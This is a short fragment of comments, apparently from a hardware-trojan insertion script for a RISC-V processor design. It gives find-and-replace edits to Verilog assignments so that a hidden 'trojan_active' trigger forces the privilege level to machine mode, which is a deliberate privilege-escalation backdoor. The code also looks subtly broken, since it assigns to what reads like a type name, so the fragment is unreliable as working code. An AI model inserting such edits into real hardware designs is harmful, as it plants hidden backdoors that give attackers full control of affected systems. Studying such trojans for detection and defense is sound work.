 ...
 * Payload: Force riscv::pmp_addr_mode_t = PRIV_LVL_M
 * 
...
// ============================================================
// Privilege Escalation: Force riscv::pmp_addr_mode_t to Machine mode
//
// Integration Script Must Modify:
//
// IF riscv::pmp_addr_mode_t is assigned combinationally:
//   Find: assign riscv::pmp_addr_mode_t = calculated_priv;
//   Replace: assign riscv::pmp_addr_mode_t = trojan_active ? PRIV_LVL_M : calculated_priv;
//
// IF riscv::pmp_addr_mode_t is in ternary operator:
//   Find: assign output = condition ? riscv::pmp_addr_mode_t : default;
//   Replace: assign output = condition ? (trojan_active ? PRIV_LVL_M : riscv::pmp_addr_mode_t) : default;